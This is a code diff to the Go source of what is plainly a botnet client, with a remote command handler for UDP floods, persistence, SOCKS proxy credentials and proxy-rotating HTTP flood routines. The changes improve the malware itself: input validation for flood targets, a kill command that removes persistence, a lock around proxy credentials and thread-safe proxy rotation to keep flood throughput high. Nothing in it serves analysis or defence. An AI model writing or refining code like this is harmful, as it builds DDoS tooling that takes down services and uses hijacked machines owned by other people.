@@ -138,8 +138,14 @@ func blackEnergy(conn net.Conn, command string) error {
 			return fmt.Errorf("invalid format")
 		}
 		target := fields[1]
-		targetPort, _ := strconv.Atoi(fields[2])
-		duration, _ := strconv.Atoi(fields[3])
+		targetPort, err := strconv.Atoi(fields[2])
+		if err != nil || targetPort < 0 || targetPort > 65535 {
+			return fmt.Errorf("invalid port: %s", fields[2])
+		}
+		duration, err := strconv.Atoi(fields[3])
+		if err != nil || duration <= 0 {
+			return fmt.Errorf("invalid duration: %s", fields[3])
+		}
 		switch cmd {
 		case "!udpflood":
 			go snorlax(target, targetPort, duration)
@@ -182,8 +188,8 @@ func blackEnergy(conn net.Conn, command string) error {
 		go dragonfly()
 		conn.Write([]byte("Persistence setup initiated\n"))
 	case "!kill":
-		conn.Write([]byte("Bot shutting down\n"))
-		os.Exit(0)
+		conn.Write([]byte("Bot killing persistence and shutting down\n"))
+		nukeAndExit()
 	case "!info":
 		hostname, _ := os.Hostname()
 		arch := charmingKitten()
@@ -206,8 +212,10 @@ func blackEnergy(conn net.Conn, command string) error {
 		if len(fields) < 3 {
 			return fmt.Errorf("usage: !socksauth <username> <password>")
 		}
+		socksCredsMutex.Lock()
 		socksUsername = fields[1]
 		socksPassword = fields[2]
+		socksCredsMutex.Unlock()
 		conn.Write([]byte(fmt.Sprintf("SOCKS: Auth updated (user: %s)\n", fields[1])))
 	default:
 		return fmt.Errorf("unknown command")
@@ -282,8 +290,11 @@ func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
 		return nil, err
 	}
 
-	// Very short timeouts to skip bad proxies fast and maximize RPS
-	shortTimeout := 2 * time.Second
+	// Use the caller's timeout (default short to skip bad proxies fast)
+	shortTimeout := timeout
+	if shortTimeout <= 0 {
+		shortTimeout = 2 * time.Second
+	}
 
 	transport := &http.Transport{
 		Proxy: http.ProxyURL(proxyURL),
@@ -1940,8 +1951,8 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 
 	// Dial — through proxy CONNECT tunnel or direct
 	var rawConn net.Conn
-	if len(proxyList) > 0 {
-		proxy := proxyList[rand.Intn(len(proxyList))]
+	proxy := persian() // thread-safe round-robin proxy selection
+	if proxy != "" {
 		pURL, err := url.Parse(proxy)
 		if err != nil {
 			return err
